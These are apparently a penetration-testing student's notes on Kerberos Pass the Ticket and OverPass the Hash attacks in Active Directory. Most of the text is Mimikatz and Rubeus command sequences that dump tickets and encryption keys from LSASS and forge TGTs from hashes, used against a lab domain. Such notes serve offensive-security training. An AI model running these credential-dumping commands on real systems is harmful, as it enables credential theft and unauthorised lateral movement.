Another method for moving laterally in an Active Directory environment is called a [Pass the Ticket (PtT) attack](https://attack.mitre.org/techniques/T1550/003/).

We need a valid Kerberos ticket to perform a `Pass the Ticket (PtT)`. It can be:
- Service Ticket (TGS - Ticket Granting Service) to allow access to a particular resource.
- Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.
# Harvesting Kerberos Tickets from Windows
On Windows, tickets are processed and stored by the LSASS (Local Security Authority Subsystem Service) process. Therefore, to get a ticket from a Windows system, you must communicate with LSASS and request it.

As user we can only get our _tickets_, but as local admin we can collect everything.
## Mimikatz
We can use _sekurlsa::tickets /export_ module from #mimikatz.
```cmd
mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export

dir *.kirbi # The result list of files with the extension `.kirbi`, which contain the tickets.
``` 

> [!NOTE] Different ticket
> _$_ -> correspond to the computer account (cmd-session 0-2-40a50000-DC01$@cifs-DC01.inlanefreight.htb.kirbi)
_@_ -> correspond to user account ([randomvalue]-username@service-domain.local.kirbi)

**Note:** If you pick a ticket with the service krbtgt, it corresponds to the TGT of that account.
## Robeus
We can perform the same things with #robeus.
```cmd
Rubeus.exe dump /nowrap
```
---
# Pass the Key or OverPass the Hash
The traditional `Pass the Hash (PtH)` technique involves reusing an NTLM password hash that doesn't touch Kerberos. The `Pass the Key` or `OverPass the Hash` approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full `Ticket-Granting-Ticket (TGT)`.

For more read [Robeus docs](https://github.com/GhostPack/Rubeus#example-over-pass-the-hash).

**DUMP User's HASH**
To forge our tickets, we need to have the user's hash; we can use Mimikatz to dump all users Kerberos encryption keys using the module `sekurlsa::ekeys`. This module will enumerate all key types present for the Kerberos package.
```cmd
mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

Now that we have access to the `AES256_HMAC` and `RC4_HMAC` keys, we can perform the OverPass the Hash or Pass the Key attack using `Mimikatz` and `Rubeus`.
## Mimikatz
```cmd
mimikatz.exe
mimikatz # privilege::debug
sekurlsa::pth /domain:<DOMAIN> /user:<USER> /ntlm:<HASH>
```

This will create a new `cmd.exe` window that we can use to request access to any service we want in the context of the target user.
## Robeus
To forge a ticket using `Rubeus`, we can use the module `asktgt` with the username, domain, and hash which can be `/rc4`, `/aes128`, `/aes256`, or `/des`.
```cmd
Rubeus.exe  asktgt /domain:<DOMAIN> /user: /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```